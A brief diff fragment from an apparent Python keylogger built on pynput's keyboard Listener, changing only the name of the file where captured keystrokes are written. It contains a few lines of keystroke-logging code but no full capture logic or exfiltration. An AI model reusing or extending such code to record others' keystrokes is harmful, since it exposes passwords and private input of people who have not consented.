@@ -3,7 +3,7 @@ from pynput.keyboard import Key, Listener
 
 count = 0
 keys = []
-log = open("LoggedKeys.txt", "w")
+log = open("OutputLoggedKeys.txt", "w")
 
 def on_press(key):
     global keys, count
